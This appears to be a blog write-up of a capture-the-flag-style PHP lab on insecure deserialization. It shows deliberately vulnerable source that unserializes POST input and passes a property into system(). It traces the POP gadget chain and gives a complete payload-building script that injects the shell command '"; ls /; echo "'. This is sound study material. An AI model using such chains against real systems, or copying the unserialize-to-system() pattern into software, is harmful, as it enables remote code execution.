---
title: "POP Chain Analysis & Exploit"
description: "Explore the POP Chain in a PHP lab: identify gadgets, craft a payload, and successfully achieve RCE."
date: 2025-11-11 19:00:00 +0700
categories: ["CVE Analyst"]
tags: ["analyst", "plugin", "pop chain", "insecure deserialize"]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## Intro

During my research on **Insecure Deserialization**, I received a lab related to **POP Chain** (Property-Oriented Programming Chain). This is an interesting type of attack: instead of exploiting a function or command directly, an attacker composes *gadgets* (magic methods from classes) to achieve a goal — for example, executing system commands (RCE).

This post describes my analysis and exploitation of the lab: reviewing the source code, identifying useful gadgets, and building a payload to trigger the call chain (POP chain). The goal is to help you understand the thought process when tackling labs of this kind.

The lab I worked on:
[https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php](https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php)

## Analysis

### Source code overview

```php {title="lab.php" data-open=true}
<?php
class User{
	public $name;
	private $memo;
	function __construct($name){
		$this->name=$name;
	}
	function __wakeup(){
		$this->memo=new Note($this -> name."say hello", 'test_whale');
	}
	function __get($content){
		return $this->memo;
	}
}
class Note{
	public $content;
	public $whale;
	function __construct($content, $whale){
		$this->content=$content;
		$this->whale=$whale;
	}
	function __toString(){
		$this->record($this->whale, $this->content);
		return 'Record for '.$this->whale.' is : '.$this->content;
	}
	function record($whale, $content){
		//check whether it's an attribute
		$test=$whale->$content;
		if ($test!=NULL){
			echo("It's probably an attribute");
		}
	}
}
class Whale{
	public $name;
	private $note;
	function __construct($name){
		$this->name=$name;
	}
	function take_note($note){
		$this->note=date("Y/m/d H:i:s").$note;
	}
	function __get($attribute){
		system('echo "'.$this->name.'" >> log.txt');
		return $this->$attribute;
	}
	function __toString(){
		return $this->name;
	}
}
if (isset($_POST['pop'])){
	unserialize(base64_decode($_POST['pop']));
}
?>
```

The main file contains three important classes: `User`, `Note`, and `Whale`. At the end of the file there is an `unserialize` on input if `$_POST['pop']` is provided:

```php
if (isset($_POST['pop'])){
    unserialize(base64_decode($_POST['pop']));
}
```

Notable points:

* Line **8**: `User::__wakeup()` creates a `Note` and assigns it to `$this->memo`.
* Line **23**: `Note::__toString()` calls `record()` then returns a string.
* Line **28**: `Note::record()` accesses `$whale->$content`.
* Line **44**: `Whale::__get()` calls `system('echo "'.$this->name.'" >> log.txt');`.
* Line **52**: the `unserialize(...)` call — the attack surface.

### Execution flow leading to shell

1. **Unserialize a `User`**: When a `User` object is unserialized, the magic method `__wakeup()` runs. Here `__wakeup()` initializes a new `Note` using `$this->name . "say hello"` as content and `'test_whale'` as whale:

   ```php
   $this->memo = new Note($this->name . "say hello", 'test_whale');
   ```
2. **`Note::__toString()` calls `record()`**: `__toString()` in `Note` calls `record($this->whale, $this->content)` before returning the string. `__toString()` is invoked when the object is cast to a string. We can abuse `$this->name` so that it is an object in the Note; it will be cast to string when concatenated with `"say hello"` at line 9.
3. **`record()` accesses a dynamic property on `$whale`**: Inside `record()` there is:

   ```php
   $test = $whale->$content;
   ```

   If `$whale` is a `Whale` object and `$content` does not match an existing property, PHP will call the magic `Whale::__get($attribute)`.
4. **`Whale::__get()` executes `system()`**: `Whale::__get()` contains:

   ```php
   system('echo "'.$this->name.'" >> log.txt');
   ```

   Because `system()` invokes a shell, if `$this->name` contains command-breaking characters (for example `"; ls /; echo "`), an attacker can inject and execute shell commands leading to RCE.

## Exploit

Create a file similar to the original but containing code that builds the serialized payload:

```php {title="lab_copy.php" hl_lines=[6,52,53,54]}
<?php
class User{
	public $name;
	private $memo;
	function __construct(){
		$this->name= new Note("Top2",new Whale(('"; ls /; echo "')));
	}
	function __wakeup(){
		$this->memo=new Note($this -> name."say hello", 'test_whale');
	}
	function __get($content){
		return $this->memo;
	}
}
class Note{
	public $content;
	public $whale;
	function __construct($content, $whale){
		$this->content=$content;
		$this->whale=$whale;
	}
	function __toString(){
		$this->record($this->whale, $this->content);
		return 'Record for '.$this->whale.' is : '.$this->content;
	}
	function record($whale, $content){
		//check whether it's an attribute
		$test=$whale->$content;
		if ($test!=NULL){
			echo("It's probably an attribute");
		}
	}
}
class Whale{
	public $name;
	private $note;
	function __construct($name){
		$this->name=$name;
	}
	function take_note($note){
		$this->note=date("Y/m/d H:i:s").$note;
	}
	function __get($attribute){
		system('echo "'.$this->name.'" >> log.txt');
		return $this->$attribute;
	}
	function __toString(){
		return $this->name;
	}
}

$u = new User();
$searialize = serialize($u);
echo base64_encode(''. $searialize .'');
?>
```

Run this file and copy the returned base64 string:

![Base64](base64_return.png "Returned base64 string")

Send the request according to the challenge:

![RCE](result.png "Successful RCE")
